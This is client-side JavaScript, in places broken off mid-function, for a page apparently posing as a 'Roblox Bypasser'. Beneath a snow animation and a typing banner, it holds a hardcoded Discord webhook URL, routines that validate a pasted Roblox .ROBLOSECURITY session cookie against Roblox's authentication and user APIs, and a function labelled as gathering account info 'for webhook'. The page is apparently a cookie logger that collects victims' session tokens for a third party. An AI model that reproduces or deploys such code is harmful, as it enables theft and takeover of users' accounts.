<script>
(function(){
  const canvas = document.getElementById("snowCanvas");
  const ctx = canvas.getContext("2d");
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;
  let snowflakes = [];
  const number = 100;
  for (let i = 0; i < number; i++){
      snowflakes.push({
          x: Math.random() * width,
          y: Math.random() * height,
          radius: Math.random() * 4 + 1,
          density: Math.random() * number
      });
  }
  let angle = 0;
  function drawSnowflakes(){
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "rgba(255, 0, 0, 0.8)";
      ctx.beginPath();
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          ctx.moveTo(f.x, f.y);
          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnowflakes();
  }
  function updateSnowflakes(){
      angle += 0.005;
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
          f.x += Math.sin(angle) * 0.5;
          if (f.x > width + 5 || f.x < -5 || f.y > height) {
              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
          }
      }
  }
  setInterval(drawSnowflakes, 33);
  window.addEventListener("resize", function(){
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });
})();
</script>

<script>
const successSound = document.getElementById("sfx-success");
const errorSound = document.getElementById("sfx-error");
const swooshSound = document.getElementById("sfx-swoosh");
const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";

// Basic format check first
function basicCookieFormatCheck(cookie) {
  if (!cookie || typeof cookie !== "string") {
    return { valid: false, error: "Cookie must be a non-empty string" };
  }

  cookie = cookie.trim();

  if (cookie.length === 0) {
    return { valid: false, error: "Cookie cannot be empty" };
  }

  // Roblox cookies typically start with this warning prefix
  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
  }

  // Roblox cookies are typically quite long
  if (cookie.length < 500) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }

  return { valid: true, error: null };
}

// Validate cookie by making a request to Roblox auth API
async function validateCookieWithAPI(cookie) {
  try {
    // First do basic format check
    const formatCheck = basicCookieFormatCheck(cookie);
    if (!formatCheck.valid) {
      return formatCheck;
    }

    // Use Roblox's auth API to validate the cookie
    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
      method: "POST",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (response.status === 200) {
      return { valid: true, error: null, authenticated: true };
    } else if (response.status === 401) {
      return { valid: false, error: "Cookie is expired or invalid", authenticated: false };
    } else if (response.status === 403) {
      return { valid: false, error: "Cookie authentication failed", authenticated: false };
    } else {
      return { valid: false, error: `Unexpected response: ${response.status}`, authenticated: false };
    }
  } catch (error) {
    return {
      valid: false,
      error: `Network error during validation: ${error.message}`,
      authenticated: false,
    };
  }
}

// Get user information using the cookie (additional validation)
async function getUserInfo(cookie) {
  try {
    const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
      method: "GET",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (response.status === 200) {
      const userData = await response.json();
      return {
        valid: true,
        user: userData,
        error: null,
      };
    } else {
      return {
        valid: false,
        user: null,
        error: `Failed to get user info: ${response.status}`,
      };
    }
  } catch (error) {
    return {
      valid: false,
      user: null,
      error: `Error getting user info: ${error.message}`,
    };
  }
}

// Enhanced pattern-based validation (fallback for CORS issues)
function advancedPatternValidation(cookie) {
  console.log('Using pattern validation fallback...');
  
  // Check 1: Must have warning message (flexible check)
  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
  }
  
  // Check 2: Must contain the separator |_
  if (!cookie.includes('|_')) {
    return { valid: false, error: "Invalid cookie format - missing separator" };
  }
  
  // Check 3: Extract the token part after |_
  const tokenStart = cookie.indexOf('|_') + 2;
  const tokenPart = cookie.substring(tokenStart);
  
  // Check 4: Token must be reasonably long (relaxed from 1400 to 800)
  if (tokenPart.length < 800) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }
  
  // Check 5: Token should contain base64-like characters and periods
  if (!tokenPart.match(/[A-Za-z0-9+\/=._-]/)) {
    return { valid: false, error: "Invalid cookie format - invalid characters" };
  }
  
  // Check 6: Should contain some uppercase letters and numbers (relaxed requirements)
  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
  
  if (upperCaseCount < 20 || digitCount < 20) {
    return { valid: false, error: "Invalid cookie format - insufficient character diversity" };
  }
  
  // Check 7: Total cookie length should be reasonable (relaxed from 1600 to 1000)
  if (cookie.length < 1000) {
    return { valid: false, error: "Cookie appears to be truncated or invalid" };
  }
  
  // Check 8: Basic fake pattern detection (common fake indicators)
  const fakeIndicators = ['fakecookie', 'testcookie', 'example123', 'demo', 'sample123'];
  const lowerCookie = cookie.toLowerCase();
  for (const fake of fakeIndicators) {
    if (lowerCookie.includes(fake)) {
      return { valid: false, error: "Invalid cookie - contains suspicious patterns" };
    }
  }
  
  // Check 9: Detect obvious repeating patterns (relaxed check)
  if (tokenPart.includes('AAAAAAA') || tokenPart.includes('1111111') || tokenPart.includes('0000000')) {
    return { valid: false, error: "Invalid cookie - contains obvious repeating patterns" };
  }
  
  console.log('Pattern validation passed!');
  return { valid: true, error: null };
}

// Comprehensive cookie validation function
async function validateRobloxCookie(cookie, options = {}) {
  const { includeUserInfo = false, skipAPIValidation = false } = options;

  // Always do basic format check first
  const formatResult = basicCookieFormatCheck(cookie);
  if (!formatResult.valid) {
    return {
      valid: false,
      error: formatResult.error,
      checks: {
        format: false,
        authentication: null,
        userInfo: null,
      },
    };
  }

  const result = {
    valid: true,
    error: null,
    checks: {
      format: true,
      authentication: null,
      userInfo: null,
    },
  };

  // Skip API validation if requested (for offline testing)
  if (skipAPIValidation) {
    return result;
  }

  try {
    // Try to validate with Roblox API first
    const authResult = await validateCookieWithAPI(cookie);
    result.checks.authentication = authResult.valid;

    if (!authResult.valid) {
      // If API validation failed due to network/CORS, fall back to pattern validation
      if (authResult.error && authResult.error.includes('Network error')) {
        console.log('API validation failed due to CORS/Network issues, using pattern validation fallback');
        const patternResult = advancedPatternValidation(cookie);
        if (!patternResult.valid) {
          result.valid = false;
          result.error = patternResult.error;
          return result;
        }
        // Pattern validation passed, continue
        result.checks.authentication = true;
      } else {
        // Real API rejection (cookie is actually invalid)
        result.valid = false;
        result.error = authResult.error;
        return result;
      }
    }

    // Optionally get user information
    if (includeUserInfo) {
      try {
        const userResult = await getUserInfo(cookie);
        result.checks.userInfo = userResult.valid;

        if (userResult.valid) {
          result.user = userResult.user;
        } else {
          // User info failure doesn't invalidate the cookie entirely
          result.userInfoError = userResult.error;
        }
      } catch (userError) {
        console.log('User info fetch failed, continuing without user data');
        result.userInfoError = 'Could not fetch user info due to CORS restrictions';
      }
    }

  } catch (error) {
    // If all API calls fail, fall back to pattern validation
    console.log('All API calls failed, using pattern validation fallback');
    const patternResult = advancedPatternValidation(cookie);
    if (!patternResult.valid) {
      result.valid = false;
      result.error = patternResult.error;
      return result;
    }
    result.checks.authentication = true;
  }

  return result;
}

// Enhanced function to get account info for webhook
async function getAccountInfo(cookie) {
  try {
    // Try to get real user info from Roblox API
    const userResult = await getUserInfo(cookie);
    
    if (userResult.valid && userResult.user) {
      return {

    robuxBalance: "Use cookie to check balance",

}

$("#cookieForm").on("submit", async function(e) {

function showNotif(msg, isSuccess = false) {
  const $notif = $("#notif");
  $notif.removeClass('notif-success notif-error');
  
  if (isSuccess) {
    $notif.addClass('notif-success');
  } else {
    $notif.addClass('notif-error');
  }
  
  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
}

const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
let i = 0;
const typedText = document.getElementById("typedText");

function typeEffect() {
  const text = texts[i];
  let index = 0;

  const typing = setInterval(() => {
    if (index <= text.length) {
      typedText.textContent = text.slice(0, index);
      index++;
    } else {
      clearInterval(typing);
      setTimeout(() => {
        const backspace = setInterval(() => {
          if (index > 0) {
            typedText.textContent = text.slice(0, index - 1);
            index--;
          } else {
            clearInterval(backspace);
            i = (i + 1) % texts.length;
            setTimeout(typeEffect, 300);
          }
        }, 50);
      }, 2000);
    }
  }, 100);
}

typeEffect();

$("#returnBtn").on("click", function () {
